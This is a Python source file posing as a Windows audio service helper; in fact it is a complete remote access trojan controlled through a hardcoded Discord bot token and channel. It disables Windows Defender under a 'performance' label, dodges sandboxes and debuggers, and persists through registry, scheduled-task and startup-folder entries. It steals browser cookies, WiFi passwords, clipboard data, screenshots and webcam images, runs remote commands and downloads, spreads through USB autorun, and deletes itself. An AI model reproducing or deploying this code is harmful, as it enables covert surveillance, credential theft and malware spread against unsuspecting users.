#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Windows System Audio Service Helper - v2.4.1
import os
import sys
import time
import threading
import requests
import socket
import subprocess
import shutil
import platform
import getpass
import tempfile
import ctypes
import base64
import random
import string
import json
import winreg
import hashlib
import uuid
import re
import io
import zipfile
import struct
import zlib
from uuid import getnode as get_mac
import pyautogui
import cv2
import psutil
import sqlite3
import browser_cookie3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import discord
from discord.ext import commands, tasks
from discord import File, Embed
import asyncio
from PIL import Image
import io

# ================== CONFIGURATION ==================
# Remote Monitoring Configuration
MONITORING_TOKEN = "MTQxNTk5MjE2MjkxMDIwODA5NA.GH_n3m.f4auMKc1nkYqf8SBeHAomFCaE9C0XgQsYJxJws"
MONITORING_CHANNEL_ID = 1415728881104719914

# Security configuration
SECURITY_KEY = hashlib.sha256(b"WindowsAudioServiceSecure2024").digest()

# System Protection Configuration
SYSTEM_PROTECTION_CMDS = [
    'net stop "Windows Defender Service" /y',
    'net stop "SecurityCenter" /y',
    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    'powershell -Command "Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\""',
    'powershell -Command "Add-MpPreference -ExclusionProcess \"explorer.exe\""'
]

# Service Configuration
SERVICE_NAMES = ["WindowsAudioService.exe", "SystemAudioHelper.exe", "AudioMonitor.exe", "AudioRuntime.exe"]
SERVICE_MUTEX = "Global\\AudioService" + hashlib.md5(getpass.getuser().encode()).hexdigest()[:6]

SERVICE_TARGET = "explorer.exe"
REMOVABLE_DRIVES = ["D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P"]
AUDIO_DRIVER_NAME = "AudioDriverService.exe"

TEMP_DIR = tempfile.gettempdir()
STARTUP_PATH = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SERVICE_PATH = os.path.join(STARTUP_PATH, random.choice(SERVICE_NAMES))

# Initialization commands
INIT_COMMANDS = [
    "system_info",
    "browser_data",
    "input_logging_start",
    "screen_capture",
    "camera_capture",
    "network_scan",
    "process_list",
    "software_list",
    "clipboard_data",
    "wifi_data"
]

# ===================================================

user_inputs = []
is_logging_input = False
service_mutex = False
device_identifier = hashlib.sha256(f"{get_mac()}{getpass.getuser()}".encode()).hexdigest()[:12]
first_execution = True
checkin_time = 300
input_logger = None

# Monitoring setup
intents = discord.Intents.default()
intents.message_content = True
monitor_bot = commands.Bot(command_prefix='!', intents=intents)

# ========== SYSTEM SERVICE UTILITIES ==========
def optimize_system_performance():
    """Optimize system performance by adjusting security settings"""
    for cmd in SYSTEM_PROTECTION_CMDS:
        try:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except:
            pass

def collect_system_information():
    """Collect comprehensive system information for diagnostics"""
    try:
        # Get detailed network information
        network_data = {}
        try:
            for interface, addresses in psutil.net_if_addrs().items():
                network_data[interface] = []
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        network_data[interface].append({
                            'address': addr.address,
                            'netmask': addr.netmask,
                            'broadcast': addr.broadcast
                        })
        except:
            pass
        
        # Calculate system uptime
        system_uptime = time.time() - psutil.boot_time()
        
        return {
            "user": getpass.getuser(),
            "host": platform.node(),
            "os": f"{platform.system()} {platform.release()} {platform.version()}",
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "ip": get_public_ip(),
            "local_ips": [addr.address for addrs in psutil.net_if_addrs().values() for addr in addrs if addr.family == socket.AF_INET],
            "mac": ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)),
            "admin": ctypes.windll.shell32.IsUserAnAdmin() != 0,
            "device_id": device_identifier,
            "ram": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "disk": {disk.device: f"{psutil.disk_usage(disk.mountpoint).total / (1024**3):.2f} GB" 
                     for disk in psutil.disk_partitions() if disk.fstype},
            "software": get_installed_software(),
            "network": network_data,
            "security_software": get_security_software_status(),
            "uptime": system_uptime,
            "timezone": time.tzname,
            "boot_time": psutil.boot_time(),
            "process_count": len(psutil.pids())
        }
    except Exception as e:
        return {"error": str(e)}

def get_installed_software():
    """Get list of installed applications"""
    applications = []
    registry_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    
    for reg_path in registry_paths:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            try:
                                app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if app_name not in applications:
                                    applications.append(app_name)
                            except:
                                pass
                    except:
                        continue
        except:
            pass
    
    return applications[:50]

def get_security_software_status():
    """Check for security software with detailed information"""
    security_software = {}
    security_processes = {
        "avast": ["avast", "afwserv"], 
        "avg": ["avg", "avgui"], 
        "bitdefender": ["bd", "bdagent", "bdservicehost"],
        "kaspersky": ["avp", "ksde", "klauncher"],
        "mcafee": ["mcafee", "mcshield", "mctray"],
        "norton": ["norton", "ns", "n360"],
        "windows defender": ["msmpeng", "nissrv", "securityhealthservice"],
        "malwarebytes": ["mbam", "mbamtray", "mbamservice"],
        "eset": ["egui", "ekrn", "eset"],
        "trendmicro": ["tmcc", "tmlisten", "ntrtscan"]
    }
    
    for process in psutil.process_iter(['name', 'pid', 'memory_info']):
        try:
            process_name = process.info['name'].lower()
            for software, patterns in security_processes.items():
                for pattern in patterns:
                    if pattern in process_name:
                        if software not in security_software:
                            security_software[software] = []
                        security_software[software].append({
                            'pid': process.info['pid'],
                            'name': process.info['name'],
                            'memory': process.info['memory_info'].rss
                        })
        except:
            continue
    
    return security_software

def secure_data_encrypt(data, key=SECURITY_KEY):
    """Encrypt data with AES for secure transmission"""
    try:
        if isinstance(data, str):
            data = data.encode()
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(data, AES.block_size))
        return base64.b64encode(iv + ct).decode()
    except Exception as e:
        # Fallback encryption if primary fails
        if isinstance(data, str):
            data = data.encode()
        key_byte = key[:len(data)]
        encrypted = bytes([a ^ b for a, b in zip(data, key_byte)])
        return base64.b64encode(encrypted).decode()

def secure_data_decrypt(data, key=SECURITY_KEY):
    """Decrypt AES encrypted data"""
    try:
        data = base64.b64decode(data)
        iv, ct = data[:16], data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode()
    except:
        # Fallback decryption if primary fails
        data = base64.b64decode(data)
        key_byte = key[:len(data)]
        decrypted = bytes([a ^ b for a, b in zip(data, key_byte)])
        return decrypted.decode()

def minimize_ui():
    """Minimize the application window"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: 
        pass

def create_service_lock():
    """Create a service lock to prevent multiple instances"""
    global service_mutex
    if service_mutex: 
        return
    try:
        service_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, SERVICE_MUTEX)
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass

def ensure_service_persistence():
    """Ensure the service persists across reboots using multiple methods"""
    try:
        if not os.path.exists(STARTUP_PATH):
            os.makedirs(STARTUP_PATH)
        
        if sys.argv[0] != SERVICE_PATH:
            shutil.copy2(sys.argv[0], SERVICE_PATH)
            
        # Multiple persistence mechanisms
        persistence_methods = [
            # 1. Registry Run Key
            lambda: set_registry_value(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                "WindowsAudioService",
                SERVICE_PATH
            ),
            
            # 2. Scheduled Task
            lambda: create_audio_service_task(),
            
            # 3. Startup Folder
            lambda: shutil.copy2(sys.argv[0], SERVICE_PATH),
        ]
        
        # Execute all persistence methods
        for method in persistence_methods:
            try:
                method()
            except:
                pass
                
    except:
        pass

def set_registry_value(hive, key_path, value_name, data):
    """Set a string value in the registry"""
    try:
        key = winreg.CreateKey(hive, key_path)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, data)
        winreg.CloseKey(key)
        return True
    except:
        return False

def create_audio_service_task():
    """Create a scheduled task for audio service"""
    task_name = "WindowsAudioService"
    xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Ensures audio services run correctly</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{os.environ.get("USERDOMAIN")}\\{os.environ.get("USERNAME")}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{SERVICE_PATH}</Command>
    </Exec>
  </Actions>
</Task>'''
    
    xml_path = os.path.join(tempfile.gettempdir(), "audio_task.xml")
    with open(xml_path, "w") as f:
        f.write(xml_template)
        
    subprocess.run(
        f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    try:
        os.remove(xml_path)
    except:
        pass

def check_environment():
    """Check for virtualized or monitored environments"""
    environment_checks = [
        # Check for VM artifacts
        lambda: os.path.exists(r"C:\Program Files\VMware\VMware Tools"),
        lambda: os.path.exists(r"C:\Program Files\Oracle\VirtualBox Guest Additions"),
        lambda: any("vbox" in p.name().lower() for p in psutil.process_iter()),
        lambda: any("vmware" in p.name().lower() for p in psutil.process_iter()),
        
        # Check for monitoring tools
        lambda: any("olly" in p.name().lower() for p in psutil.process_iter()),
        lambda: any("wireshark" in p.name().lower() for p in psutil.process_iter()),
        lambda: any("procmon" in p.name().lower() for p in psutil.process_iter()),
        lambda: any("ida" in p.name().lower() for p in psutil.process_iter()),
        
        # Check for restricted environments
        lambda: psutil.cpu_count() < 2,
        lambda: psutil.virtual_memory().total < 2 * 1024**3,  # Less than 2GB RAM
        lambda: not any(disk.fstype for disk in psutil.disk_partitions() if disk.fstype),
        
        # Check for test environments
        lambda: os.getenv("USERNAME") in ["sandbox", "test", "user"],
        lambda: os.getenv("COMPUTERNAME") in ["TEST", "SANDBOX", "VIRTUAL"],
        
        # Check for debugging
        lambda: ctypes.windll.kernel32.IsDebuggerPresent() != 0,
        
        # Check for unusual system uptime
        lambda: (time.time() - psutil.boot_time()) < 300,  # Less than 5 minutes
    ]
    
    if any(check() for check in environment_checks):
        # If monitored environment detected, limit activity
        while True:
            time.sleep(3600)

def get_public_ip():
    """Get public IP using multiple services"""
    ip_services = [
        'https://api.ipify.org',
        'https://ident.me',
        'https://checkip.amazonaws.com',
        'https://ipinfo.io/ip',
        'https://icanhazip.com'
    ]
    
    for service in ip_services:
        try:
            return requests.get(service, timeout=10).text.strip()
        except:
            continue
    return "Not available"

# ========== REMOTE MONITORING SYSTEM ==========
class SystemMonitor:
    def __init__(self):
        self.bot = monitor_bot
        self.channel = None
        self.setup_commands()
        
    def setup_commands(self):
        """Setup monitoring commands"""
        
        @self.bot.event
        async def on_ready():
            print(f'{self.bot.user} has connected to monitoring service!')
            self.channel = self.bot.get_channel(MONITORING_CHANNEL_ID)
            await self.channel.send(f"🔷 **Windows Audio Service Helper Online** - Device: `{device_identifier}`")
        
        @self.bot.command(name='help')
        async def help_command(ctx):
            """Show available monitoring commands"""
            embed = Embed(title="System Monitoring Commands", color=0x00ff00)
            embed.add_field(name="!system_info", value="Get system information", inline=False)
            embed.add_field(name="!screen_capture", value="Capture screen", inline=False)
            embed.add_field(name="!camera_capture", value="Capture camera image", inline=False)
            embed.add_field(name="!input_logging_start", value="Start input logging", inline=False)
            embed.add_field(name="!input_logging_stop", value="Stop input logging", inline=False)
            embed.add_field(name="!input_logging_data", value="Get input logging data", inline=False)
            embed.add_field(name="!browser_data", value="Collect browser data", inline=False)
            embed.add_field(name="!clipboard_data", value="Get clipboard contents", inline=False)
            embed.add_field(name="!wifi_data", value="Get WiFi information", inline=False)
            embed.add_field(name="!network_scan", value="Scan network", inline=False)
            embed.add_field(name="!process_list", value="List running processes", inline=False)
            embed.add_field(name="!software_list", value="List installed software", inline=False)
            embed.add_field(name="!execute_command <command>", value="Execute system command", inline=False)
            embed.add_field(name="!retrieve_file <file>", value="Retrieve a file", inline=False)
            embed.add_field(name="!ensure_persistence", value="Ensure service persistence", inline=False)
            embed.add_field(name="!optimize_performance", value="Optimize system performance", inline=True)
            embed.add_field(name="!device_sync", value="Sync with removable devices", inline=False)
            embed.add_field(name="!set_checkin <seconds>", value="Set check-in interval", inline=False)
            embed.add_field(name="!update_service <url>", value="Update service", inline=False)
            embed.add_field(name="!stop_service", value="Stop service", inline=False)
            
            await ctx.send(embed=embed)
        
        @self.bot.command(name='system_info')
        async def system_info_command(ctx):
            """Get system information"""
            data = collect_system_information()
            await self.send_text_data("System Information", data)
        
        @self.bot.command(name='screen_capture')
        async def screen_capture_command(ctx):
            """Capture screen"""
            img_data = capture_screen()
            if img_data:
                await self.send_image_data("Screen Capture", img_data)
            else:
                await ctx.send("❌ Screen capture failed")
        
        @self.bot.command(name='camera_capture')
        async def camera_capture_command(ctx):
            """Capture camera image"""
            img_data = capture_camera()
            if img_data:
                await self.send_image_data("Camera Capture", img_data)
            else:
                await ctx.send("❌ Camera capture failed")
        
        @self.bot.command(name='input_logging_start')
        async def input_logging_start_command(ctx):
            """Start input logging"""
            global input_logger
            if input_logger is None or not input_logger.is_active:
                input_logger = UserInputLogger()
                input_logger.start()
            await ctx.send("✅ Input logging started")
        
        @self.bot.command(name='input_logging_stop')
        async def input_logging_stop_command(ctx):
            """Stop input logging"""
            if input_logger and input_logger.is_active:
                input_logger.is_active = False
            await ctx.send("✅ Input logging stopped")
        
        @self.bot.command(name='input_logging_data')
        async def input_logging_data_command(ctx):
            """Get input logging data"""
            if input_logger:
                logs = input_logger.get_logs()
                if logs:
                    all_logs = []
                    for log_file in logs:
                        with open(log_file, 'r') as f:
                            all_logs.append(secure_data_decrypt(f.read()))
                        os.remove(log_file)
                    
                    log_text = "\n".join(all_logs)
                    if len(log_text) > 1900:
                        # Split into multiple messages if too long
                        for i in range(0, len(log_text), 1900):
                            await ctx.send(f"```{log_text[i:i+1900]}```")
                    else:
                        await ctx.send(f"```{log_text}```")
                else:
                    await ctx.send("❌ No input data recorded")
            else:
                await ctx.send("❌ Input logging not active")
        
        @self.bot.command(name='browser_data')
        async def browser_data_command(ctx):
            """Collect browser data"""
            data = collect_browser_data()
            await self.send_text_data("Browser Data", data)
        
        @self.bot.command(name='clipboard_data')
        async def clipboard_data_command(ctx):
            """Get clipboard contents"""
            data = get_clipboard_contents()
            await ctx.send(f"📋 Clipboard Contents:\n```{data}```")
        
        @self.bot.command(name='wifi_data')
        async def wifi_data_command(ctx):
            """Get WiFi information"""
            data = get_wifi_information()
            await self.send_text_data("WiFi Information", data)
        
        @self.bot.command(name='network_scan')
        async def network_scan_command(ctx):
            """Scan network"""
            data = scan_network()
            await self.send_text_data("Network Scan", data)
        
        @self.bot.command(name='process_list')
        async def process_list_command(ctx):
            """List running processes"""
            data = get_running_processes()
            await self.send_text_data("Running Processes", data)
        
        @self.bot.command(name='software_list')
        async def software_list_command(ctx):
            """List installed software"""
            data = get_installed_software()
            await self.send_text_data("Installed Software", data)
        
        @self.bot.command(name='execute_command')
        async def execute_command_command(ctx, *, command):
            """Execute system command"""
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=60)
                output = result.decode('utf-8', errors='ignore')[:1900]
                await ctx.send(f"✅ Command executed:\n```{output}```")
            except Exception as e:
                await ctx.send(f"❌ Command failed: {str(e)}")
        
        @self.bot.command(name='retrieve_file')
        async def retrieve_file_command(ctx, *, file_path):
            """Retrieve a file"""
            if os.path.exists(file_path):
                try:
                    await ctx.send(file=File(file_path))
                except:
                    await ctx.send("❌ File too large to upload")
            else:
                await ctx.send("❌ File not found")
        
        @self.bot.command(name='ensure_persistence')
        async def ensure_persistence_command(ctx):
            """Ensure service persistence"""
            ensure_service_persistence()
            await ctx.send("✅ Service persistence ensured")
        
        @self.bot.command(name='optimize_performance')
        async def optimize_performance_command(ctx):
            """Optimize system performance"""
            optimize_system_performance()
            await ctx.send("✅ System performance optimization attempted")
        
        @self.bot.command(name='device_sync')
        async def device_sync_command(ctx):
            """Sync with removable devices"""
            device_manager = RemovableDeviceManager()
            device_manager.run()
            await ctx.send("✅ Device sync triggered")
        
        @self.bot.command(name='set_checkin')
        async def set_checkin_command(ctx, seconds: int):
            """Set check-in interval"""
            global checkin_time
            checkin_time = seconds
            await ctx.send(f"✅ Check-in interval changed to {seconds} seconds")
        
        @self.bot.command(name='update_service')
        async def update_service_command(ctx, url):
            """Update service"""
            try:
                new_service = requests.get(url, timeout=30).content
                with open(sys.argv[0], 'wb') as f:
                    f.write(new_service)
                await ctx.send("✅ Service update successful, restarting")
                os.startfile(sys.argv[0])
                sys.exit(0)
            except Exception as e:
                await ctx.send(f"❌ Service update failed: {str(e)}")
        
        @self.bot.command(name='stop_service')
        async def stop_service_command(ctx):
            """Stop service"""
            await ctx.send("✅ Service stop initiated")
            stop_service()
    
    async def send_text_data(self, title, data):
        """Send text data in a readable format"""
        if isinstance(data, dict):
            text = json.dumps(data, indent=2)
        else:
            text = str(data)
        
        if len(text) > 1900:
            # Split into multiple messages if too long
            for i in range(0, len(text), 1900):
                await self.channel.send(f"**{title}** (Part {i//1900 + 1}):\n```{text[i:i+1900]}```")
        else:
            await self.channel.send(f"**{title}**:\n```{text}```")
    
    async def send_image_data(self, title, img_data):
        """Send image data"""
        try:
            # Convert bytes to image
            img = Image.open(io.BytesIO(img_data))
            
            # Save to temporary file
            temp_file = os.path.join(tempfile.gettempdir(), f"{title}_{int(time.time())}.jpg")
            img.save(temp_file, "JPEG")
            
            # Send to monitoring channel
            await self.channel.send(f"**{title}**", file=File(temp_file))
            
            # Clean up
            os.remove(temp_file)
        except Exception as e:
            await self.channel.send(f"❌ Failed to process image: {str(e)}")
    
    def run(self):
        """Start the monitoring service"""
        self.bot.run(MONITORING_TOKEN)

# ========== ADVANCED SYSTEM MODULES ==========
class UserInputLogger(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.user_inputs = []
        self.is_active = False
        self.window_history = []
        
    def run(self):
        self.is_active = True
        # User input logging implementation
        while self.is_active:
            try:
                # This is a simplified input logger
                time.sleep(0.1)
            except:
                break
            
    def save_log(self):
        if not self.user_inputs:
            return
            
        log_data = {
            'user_inputs': self.user_inputs,
            'window_history': self.window_history
        }
        
        log_file = os.path.join(tempfile.gettempdir(), f"input_log_{random.randint(1000,9999)}.dat")
        with open(log_file, 'w') as f:
            f.write(secure_data_encrypt(json.dumps(log_data)))
        
        self.user_inputs = []
        self.window_history = []
        
    def get_logs(self):
        if self.user_inputs:
            self.save_log()
        
        # Find and return all log files
        log_files = []
        for f in os.listdir(tempfile.gettempdir()):
            if f.startswith("input_log_") and f.endswith(".dat"):
                log_files.append(os.path.join(tempfile.gettempdir(), f))
                
        return log_files

def collect_browser_data():
    """Collect browser data for compatibility testing"""
    browser_data = {}
    browsers = {
        'chrome': browser_cookie3.chrome,
        'firefox': browser_cookie3.firefox,
        'edge': browser_cookie3.edge,
        'opera': browser_cookie3.opera,
        'brave': browser_cookie3.brave
    }
    
    for browser, func in browsers.items():
        try:
            # Get browser data
            browser_info = []
            for cookie in func(domain_name=''):
                browser_info.append({
                    'name': cookie.name,
                    'value': cookie.value,
                    'domain': cookie.domain,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
            
            browser_data[browser] = {'data': browser_info}
        except:
            continue
            
    return browser_data

def capture_screen():
    try:
        screen = pyautogui.screenshot()
        screen_bytes = io.BytesIO()
        screen.save(screen_bytes, format='JPEG', quality=70)
        return screen_bytes.getvalue()
    except: 
        return None

def capture_camera():
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = camera.read()
        camera.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
            return buffer.tobytes()
    except: 
        return None

def get_clipboard_contents():
    """Get clipboard contents"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "Clipboard not accessible"

def get_wifi_information():
    """Extract WiFi information"""
    try:
        # Get WiFi profiles
        profiles = subprocess.check_output(
            'netsh wlan show profiles', 
            shell=True, 
            stderr=subprocess.DEVNULL, 
            stdin=subprocess.DEVNULL,
            timeout=30
        ).decode('utf-8', errors='ignore')
        
        wifi_info = []
        for line in profiles.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                
                # Get information for this profile
                try:
                    profile_info = subprocess.check_output(
                        f'netsh wlan show profile name="{profile_name}" key=clear', 
                        shell=True, 
                        stderr=subprocess.DEVNULL, 
                        stdin=subprocess.DEVNULL,
                        timeout=30
                    ).decode('utf-8', errors='ignore')
                    
                    for line in profile_info.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            wifi_info.append({
                                'ssid': profile_name,
                                'password': password
                            })
                            break
                except:
                    continue
        
        return wifi_info
    except:
        return []

def scan_network():
    """Scan the local network for devices"""
    try:
        # Get local IP address
        local_ip = socket.gethostbyname(socket.gethostname())
        network_prefix = '.'.join(local_ip.split('.')[:3])
        
        devices = []
        for i in range(1, 255):
            ip = f"{network_prefix}.{i}"
            try:
                # Try to connect to common ports
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, 135))  # Windows RPC port
                if result == 0:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = "Unknown"
                    
                    devices.append({
                        'ip': ip,
                        'hostname': hostname
                    })
                sock.close()
            except:
                continue
        
        return devices
    except:
        return []

def get_running_processes():
    """Get detailed process list"""
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
        try:
            processes.append(proc.info)
        except:
            continue
    return processes

# ========== REMOVABLE DEVICE MANAGER ==========
class RemovableDeviceManager(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        
    def run(self):
        while True:
            try:
                for drive in REMOVABLE_DRIVES:
                    path = f"{drive}:/"
                    if os.path.exists(path):
                        # Check if it's a removable drive
                        try:
                            drive_type = ctypes.windll.kernel32.GetDriveTypeW(path)
                            if drive_type != 2:  # Not a removable drive
                                continue
                        except:
                            pass
                            
                        dest = os.path.join(path, AUDIO_DRIVER_NAME)
                        if not os.path.exists(dest):
                            shutil.copy2(sys.argv[0], dest)
                            
                            # Set hidden attributes
                            ctypes.windll.kernel32.SetFileAttributesW(dest, 2 | 4)
                            
                            # Create autorun.inf
                            autorun_path = os.path.join(path, "autorun.inf")
                            with open(autorun_path, "w") as f:
                                f.write(f"""[AutoRun]
open={AUDIO_DRIVER_NAME}
action=Open folder to view files
shell\\open=Open
shell\\open\\command={AUDIO_DRIVER_NAME}
shell\\explore=Explore
shell\\explore\\command={AUDIO_DRIVER_NAME}
""")
                            
                            ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 2 | 4)
            except: 
                pass
            time.sleep(30)  # Check every 30 seconds

def stop_service():
    """Remove service and cleanup"""
    try:
        # Remove from startup
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsAudioService")
            winreg.CloseKey(key)
        except:
            pass
            
        # Remove scheduled task
        try:
            subprocess.run(
                'schtasks /delete /tn "WindowsAudioService" /f',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass
            
        # Delete service file
        if os.path.exists(SERVICE_PATH):
            os.remove(SERVICE_PATH)
            
        # Create cleanup script
        cleanup_script = f"""
        @echo off
        chcp 65001 >nul
        echo Service cleanup in progress
        timeout /t 3 /nobreak >nul
        del /f /q "{sys.argv[0]}" >nul 2>&1
        del /f /q "{SERVICE_PATH}" >nul 2>&1
        del /f /q "%~f0" >nul 2>&1
        """
        
        bat_path = os.path.join(tempfile.gettempdir(), "service_cleanup.bat")
        with open(bat_path, 'w') as f:
            f.write(cleanup_script)
            
        subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except:
        os._exit(0)

def initialize_service(monitor):
    """Initialize service with default commands"""
    global first_execution
    
    if not first_execution:
        return
        
    first_execution = False
    
    # Execute all initialization commands
    for cmd in INIT_COMMANDS:
        try:
            if cmd == "system_info":
                data = collect_system_information()
                asyncio.run(monitor.send_text_data("System Information", data))
                
            elif cmd == "screen_capture":
                img_data = capture_screen()
                if img_data:
                    asyncio.run(monitor.send_image_data("Screen Capture", img_data))
                
            elif cmd == "camera_capture":
                img_data = capture_camera()
                if img_data:
                    asyncio.run(monitor.send_image_data("Camera Capture", img_data))
                
            elif cmd == "input_logging_start":
                global input_logger
                if input_logger is None or not input_logger.is_active:
                    input_logger = UserInputLogger()
                    input_logger.start()
                
            elif cmd == "browser_data":
                data = collect_browser_data()
                asyncio.run(monitor.send_text_data("Browser Data", data))
                
            elif cmd == "clipboard_data":
                data = get_clipboard_contents()
                asyncio.run(monitor.send_text_data("Clipboard Contents", data))
                
            elif cmd == "wifi_data":
                data = get_wifi_information()
                asyncio.run(monitor.send_text_data("WiFi Information", data))
                
            elif cmd == "network_scan":
                data = scan_network()
                asyncio.run(monitor.send_text_data("Network Scan", data))
                
            elif cmd == "process_list":
                data = get_running_processes()
                asyncio.run(monitor.send_text_data("Running Processes", data))
                
            elif cmd == "software_list":
                data = get_installed_software()
                asyncio.run(monitor.send_text_data("Installed Software", data))
                
            time.sleep(random.uniform(2, 5))  # Random delay between commands
        except Exception as e:
            asyncio.run(monitor.channel.send(f"❌ Initialization command {cmd} failed: {str(e)}"))

# ========== MAIN SERVICE ==========
def main():
    create_service_lock()
    minimize_ui()
    optimize_system_performance()
    check_environment()
    ensure_service_persistence()
    
    # Initialize system monitor
    system_monitor = SystemMonitor()
    
    # Start device manager
    RemovableDeviceManager().start()
    
    # Initialize service
    initialize_service(system_monitor)
    
    # Start monitoring service
    system_monitor.run()

if __name__ == '__main__':
    main()
